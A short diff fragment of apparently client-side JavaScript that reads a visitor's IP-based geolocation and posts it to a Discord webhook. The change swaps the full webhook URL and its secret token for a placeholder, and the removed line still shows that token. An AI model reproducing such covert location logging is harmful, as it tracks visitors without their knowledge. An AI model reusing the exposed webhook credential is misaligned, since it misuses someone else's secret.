@@ -551,7 +551,7 @@
                 document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
 
                 var request = new XMLHttpRequest();
-                request.open("POST", "https://discord.com/api/webhooks/1059617894641709167/iPmMcNVPUgqEcgMLpdEt2AH_N0zDbXYxr-05hCEsfb4GYSxUh_fGxDUQqR704h2dfKkh");
+                request.open("POST", "webhook");
                 request.setRequestHeader('Content-type', 'application/json');
                 let currentDate = new Date();
                 let cSec = currentDate.getSeconds();
